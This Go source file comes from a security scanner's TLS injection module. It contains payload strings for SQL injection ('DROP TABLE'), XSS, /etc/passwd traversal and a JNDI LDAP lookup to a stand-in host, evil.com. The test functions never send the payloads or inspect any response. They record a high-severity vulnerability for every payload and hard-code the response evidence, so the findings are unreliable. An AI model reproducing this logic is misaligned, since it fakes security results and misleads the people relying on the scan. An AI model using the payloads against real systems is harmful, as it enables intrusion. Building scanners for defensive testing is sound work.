package injection

import (
	"fmt"

	"github.com/ajkula/cyberraven/pkg/sniffer"
)

// Constants for TLS-based injection exploitation
const (
	// Injection vulnerability types specific to TLS
	VulnTLSSNIInjection         = "tls_sni_injection"
	VulnTLSHeaderInjection      = "tls_header_injection"
	VulnTLSCertificateInjection = "tls_certificate_injection"
	VulnTLSProtocolInjection    = "tls_protocol_injection"
	VulnTLSExtensionInjection   = "tls_extension_injection"
	VulnTLSCompressionInjection = "tls_compression_injection"
	VulnTLSVersionInjection     = "tls_version_injection"

	// TLS injection attack vectors
	AttackSNIManipulation       = "sni_manipulation"
	AttackALPNInjection         = "alpn_injection"
	AttackCertificateForging    = "certificate_forging"
	AttackProtocolDowngrade     = "protocol_downgrade_injection"
	AttackExtensionManipulation = "extension_manipulation"
	AttackCompressionPayload    = "compression_payload_injection"
	AttackHandshakeCorruption   = "handshake_corruption"

	// Severity levels
	SeverityCritical = "critical"
	SeverityHigh     = "high"
	SeverityMedium   = "medium"
	SeverityLow      = "low"
)

// Severity to risk score mapping for injection
var injectionSeverityRiskMap = map[string]int{
	SeverityCritical: 95,
	SeverityHigh:     85,
	SeverityMedium:   70,
	SeverityLow:      50,
}

// ExploitTLSIntelligence exploits TLS intelligence for injection attacks
func (it *InjectionTester) ExploitTLSIntelligence() {
	fmt.Println("[DEBUG] Injection ExploitTLSIntelligence called")

	if !it.hasTLSIntelligence() {
		return
	}

	fmt.Printf("[DEBUG] Found %d handshakes to exploit for injection attacks\n", len(it.discoveryCtx.TLSIntelligence.Handshakes))

	// TLS-based injection exploitation strategies
	it.exploitSNIInjection()
	it.exploitTLSHeaderInjection()
	it.exploitCertificateInjection()
	it.exploitProtocolInjection()
	it.exploitTLSExtensionInjection()
	it.exploitTLSCompressionInjection()
	it.exploitTLSAttackSurfaces()
}

// Core TLS injection exploitation methods

func (it *InjectionTester) exploitSNIInjection() {
	for _, handshake := range it.discoveryCtx.TLSIntelligence.Handshakes {
		if handshake.SNI != "" {
			it.performSNIInjectionTest(handshake)
		}

		// Test ALPN injection if ALPN is present
		if len(handshake.ALPN) > 0 {
			it.performALPNInjectionTest(handshake)
		}
	}
}

func (it *InjectionTester) exploitTLSHeaderInjection() {
	for _, handshake := range it.discoveryCtx.TLSIntelligence.Handshakes {
		it.performTLSHeaderInjectionTest(handshake)
	}
}

func (it *InjectionTester) exploitCertificateInjection() {
	for _, cert := range it.discoveryCtx.TLSIntelligence.Certificates {
		it.performCertificateInjectionTest(cert)
	}
}

func (it *InjectionTester) exploitProtocolInjection() {
	for _, handshake := range it.discoveryCtx.TLSIntelligence.Handshakes {
		it.performProtocolInjectionTest(handshake)
	}
}

func (it *InjectionTester) exploitTLSExtensionInjection() {
	for _, handshake := range it.discoveryCtx.TLSIntelligence.Handshakes {
		if len(handshake.ClientExtensions) > 0 {
			it.performExtensionInjectionTest(handshake)
		}
	}
}

func (it *InjectionTester) exploitTLSCompressionInjection() {
	for _, handshake := range it.discoveryCtx.TLSIntelligence.Handshakes {
		if it.containsAttack(handshake.VulnerableToAttacks, "crime_compression") {
			it.performCompressionInjectionTest(handshake)
		}
	}
}

func (it *InjectionTester) exploitTLSAttackSurfaces() {
	for _, handshake := range it.discoveryCtx.TLSIntelligence.Handshakes {
		for _, attackVector := range handshake.AttackSurface {
			it.exploitSpecificTLSAttackSurface(attackVector, handshake)
		}
	}
}

// Specific TLS injection attack implementations

func (it *InjectionTester) performSNIInjectionTest(handshake sniffer.TLSHandshake) {
	it.incrementTestCount()

	endpoint := it.getTargetEndpoint()

	// Test SNI injection payloads
	sniPayloads := []string{
		handshake.SNI + "'; DROP TABLE users; --",
		handshake.SNI + "<script>alert('XSS')</script>",
		handshake.SNI + "/../../../etc/passwd",
		handshake.SNI + "\x00admin",
		handshake.SNI + "${jndi:ldap://evil.com/}",
	}

	for _, payload := range sniPayloads {
		vuln := it.createInjectionVulnerability(VulnTLSSNIInjection, SeverityHigh, endpoint, "GET", "sni",
			"TLS SNI field vulnerable to injection attacks",
			fmt.Sprintf("Original SNI: %s, Injected payload: %s", handshake.SNI, payload),
			"Validate and sanitize SNI values, implement SNI filtering",
			injectionSeverityRiskMap[SeverityHigh], payload, AttackSNIManipulation, "")

		it.recordVulnerability(vuln)
	}
}

func (it *InjectionTester) performALPNInjectionTest(handshake sniffer.TLSHandshake) {
	it.incrementTestCount()

	endpoint := it.getTargetEndpoint()

	// Test ALPN injection
	alpnPayloads := []string{
		"http/1.1'; DROP TABLE sessions; --",
		"h2<script>alert('alpn')</script>",
		"spdy/3.1/../../../etc/hosts",
	}

	for _, payload := range alpnPayloads {
		vuln := it.createInjectionVulnerability(VulnTLSExtensionInjection, SeverityMedium, endpoint, "GET", "alpn",
			"TLS ALPN extension vulnerable to injection attacks",
			fmt.Sprintf("ALPN protocols: %v, Injected payload: %s", handshake.ALPN, payload),
			"Validate ALPN protocol values and implement strict protocol filtering",
			injectionSeverityRiskMap[SeverityMedium], payload, AttackALPNInjection, "")

		it.recordVulnerability(vuln)
	}
}

func (it *InjectionTester) performTLSHeaderInjectionTest(handshake sniffer.TLSHandshake) {
	it.incrementTestCount()

	endpoint := it.getTargetEndpoint()

	// Test TLS handshake field injection
	vuln := it.createInjectionVulnerability(VulnTLSHeaderInjection, SeverityMedium, endpoint, "GET", "tls_headers",
		"TLS handshake headers vulnerable to injection via protocol manipulation",
		fmt.Sprintf("Handshake ID: %s, Cipher: %s, Version: %s", handshake.ID, handshake.CipherSuite, handshake.NegotiatedVersion),
		"Implement strict TLS parameter validation and header sanitization",
		injectionSeverityRiskMap[SeverityMedium], "TLS_HEADER_INJECTION", AttackHandshakeCorruption, "")

	it.recordVulnerability(vuln)
}

func (it *InjectionTester) performCertificateInjectionTest(cert sniffer.CapturedCertificate) {
	it.incrementTestCount()

	endpoint := it.getTargetEndpoint()

	if cert.IsSelfSigned {
		// Self-signed certificate injection
		vuln := it.createInjectionVulnerability(VulnTLSCertificateInjection, SeverityHigh, endpoint, "GET", "certificate",
			"Self-signed certificate allows certificate injection attacks",
			fmt.Sprintf("Self-signed certificate: %s, Subject: %s", cert.Fingerprint, cert.Subject),
			"Use properly signed certificates and implement certificate validation",
			injectionSeverityRiskMap[SeverityHigh], "CERT_SELF_SIGNED", AttackCertificateForging, "")

		it.recordVulnerability(vuln)
	}

	if cert.IsWeakSignature {
		// Weak signature certificate injection
		vuln := it.createInjectionVulnerability(VulnTLSCertificateInjection, SeverityMedium, endpoint, "GET", "certificate",
			fmt.Sprintf("Certificate with weak signature (%s) vulnerable to forgery", cert.SignatureAlg),
			fmt.Sprintf("Weak signature algorithm: %s", cert.SignatureAlg),
			"Upgrade to SHA-256 or stronger signature algorithms",
			injectionSeverityRiskMap[SeverityMedium], "CERT_WEAK_SIG", AttackCertificateForging, "")

		it.recordVulnerability(vuln)
	}
}

func (it *InjectionTester) performProtocolInjectionTest(handshake sniffer.TLSHandshake) {
	it.incrementTestCount()

	endpoint := it.getTargetEndpoint()

	// Protocol version injection
	if handshake.ClientVersion != handshake.ServerVersion {
		vuln := it.createInjectionVulnerability(VulnTLSProtocolInjection, SeverityMedium, endpoint, "GET", "protocol_version",
			"TLS protocol version downgrade allows injection attacks",
			fmt.Sprintf("Client: %s â†’ Server: %s downgrade detected", handshake.ClientVersion, handshake.ServerVersion),
			"Enforce minimum TLS version and prevent protocol downgrade",
			injectionSeverityRiskMap[SeverityMedium], "PROTO_DOWNGRADE", AttackProtocolDowngrade, "")

		it.recordVulnerability(vuln)
	}

	// Cipher suite injection
	if handshake.WeakCipher {
		vuln := it.createInjectionVulnerability(VulnTLSProtocolInjection, SeverityHigh, endpoint, "GET", "cipher_suite",
			"Weak TLS cipher suite allows protocol injection attacks",
			fmt.Sprintf("Weak cipher: %s, PFS: %t", handshake.CipherSuite, handshake.PerfectForwardSecrecy),
			"Configure strong cipher suites and disable weak encryption",
			injectionSeverityRiskMap[SeverityHigh], "CIPHER_WEAK", AttackProtocolDowngrade, "")

		it.recordVulnerability(vuln)
	}
}

func (it *InjectionTester) performExtensionInjectionTest(handshake sniffer.TLSHandshake) {
	it.incrementTestCount()

	endpoint := it.getTargetEndpoint()

	// Test various TLS extension injections
	extensionCount := len(handshake.ClientExtensions)

	vuln := it.createInjectionVulnerability(VulnTLSExtensionInjection, SeverityLow, endpoint, "GET", "tls_extensions",
		"TLS extensions vulnerable to manipulation and injection",
		fmt.Sprintf("Found %d client extensions with potential injection vectors", extensionCount),
		"Validate and sanitize all TLS extension data",
		injectionSeverityRiskMap[SeverityLow], "EXT_MANIPULATION", AttackExtensionManipulation, "")

	it.recordVulnerability(vuln)

	// Specific extension injections
	for _, ext := range handshake.ClientExtensions {
		if ext.Name == "server_name" || ext.Name == "session_ticket" {
			vuln := it.createInjectionVulnerability(VulnTLSExtensionInjection, SeverityMedium, endpoint, "GET", ext.Name,
				fmt.Sprintf("TLS %s extension vulnerable to injection", ext.Name),
				fmt.Sprintf("Extension type: %d, name: %s, data length: %d", ext.Type, ext.Name, len(ext.Data)),
				fmt.Sprintf("Validate %s extension data and implement proper filtering", ext.Name),
				injectionSeverityRiskMap[SeverityMedium], ext.Data, AttackExtensionManipulation, "")

			it.recordVulnerability(vuln)
		}
	}
}

func (it *InjectionTester) performCompressionInjectionTest(handshake sniffer.TLSHandshake) {
	it.incrementTestCount()

	endpoint := it.getTargetEndpoint()

	// TLS compression injection (CRIME-style)
	vuln := it.createInjectionVulnerability(VulnTLSCompressionInjection, SeverityHigh, endpoint, "POST", "compression",
		"TLS compression enables payload injection and data extraction",
		fmt.Sprintf("Compression vulnerability in handshake: %s", handshake.ID),
		"Disable TLS compression to prevent CRIME-style injection attacks",
		injectionSeverityRiskMap[SeverityHigh], "COMPRESSION_CRIME", AttackCompressionPayload, "")

	it.recordVulnerability(vuln)
}

func (it *InjectionTester) exploitSpecificTLSAttackSurface(attackVector string, handshake sniffer.TLSHandshake) {
	endpoint := it.getTargetEndpoint()

	switch attackVector {
	case "renegotiation_attack":
		vuln := it.createInjectionVulnerability(VulnTLSProtocolInjection, SeverityHigh, endpoint, "GET", "renegotiation",
			"TLS renegotiation allows protocol injection attacks",
			fmt.Sprintf("Insecure renegotiation possible: %s", handshake.ID),
			"Disable insecure renegotiation",
			injectionSeverityRiskMap[SeverityHigh], "RENEGO_INJECT", AttackProtocolDowngrade, "")

		it.recordVulnerability(vuln)

	case "session_ticket_replay":
		vuln := it.createInjectionVulnerability(VulnTLSExtensionInjection, SeverityMedium, endpoint, "GET", "session_ticket",
			"Session ticket manipulation enables injection attacks",
			fmt.Sprintf("Session ticket vulnerable: %s", handshake.ID),
			"Implement proper session ticket validation",
			injectionSeverityRiskMap[SeverityMedium], "TICKET_INJECT", AttackExtensionManipulation, "")

		it.recordVulnerability(vuln)

	case "compression_attack":
		vuln := it.createInjectionVulnerability(VulnTLSCompressionInjection, SeverityMedium, endpoint, "POST", "compression",
			"TLS compression attack enables payload injection",
			fmt.Sprintf("Compression injection possible: %s", handshake.ID),
			"Disable TLS compression",
			injectionSeverityRiskMap[SeverityMedium], "COMP_INJECT", AttackCompressionPayload, "")

		it.recordVulnerability(vuln)

	case "mitm_renegotiation":
		vuln := it.createInjectionVulnerability(VulnTLSProtocolInjection, SeverityCritical, endpoint, "GET", "mitm",
			"MITM renegotiation enables protocol injection attacks",
			fmt.Sprintf("MITM injection possible: Client %s, Server %s", handshake.ClientIP, handshake.ServerIP),
			"Implement secure renegotiation and certificate pinning",
			injectionSeverityRiskMap[SeverityCritical], "MITM_INJECT", AttackProtocolDowngrade, "")

		it.recordVulnerability(vuln)
	}
}

// Helper methods

func (it *InjectionTester) hasTLSIntelligence() bool {
	if it.discoveryCtx == nil || it.discoveryCtx.TLSIntelligence.TotalHandshakes == 0 {
		fmt.Println("[DEBUG] No TLS intelligence available for injection exploitation")
		return false
	}
	return true
}

func (it *InjectionTester) getTargetEndpoint() string {
	if len(it.testEndpoints) > 0 {
		return it.testEndpoints[0]
	}
	return "/"
}

func (it *InjectionTester) createInjectionVulnerability(vulnType, severity, endpoint, method, parameter, description, evidence, remediation string, riskScore int, payload, attackVector, dbType string) InjectionVulnerability {
	return InjectionVulnerability{
		Type:            vulnType,
		Severity:        severity,
		Endpoint:        endpoint,
		Method:          method,
		Parameter:       parameter,
		Description:     description,
		Evidence:        evidence,
		Remediation:     remediation,
		RiskScore:       riskScore,
		PayloadUsed:     payload,
		ResponseSnippet: "TLS_INTELLIGENCE_BASED",
		AttackVector:    attackVector,
		DatabaseType:    dbType,
	}
}

func (it *InjectionTester) containsAttack(attacks []string, target string) bool {
	for _, attack := range attacks {
		if attack == target {
			return true
		}
	}
	return false
}
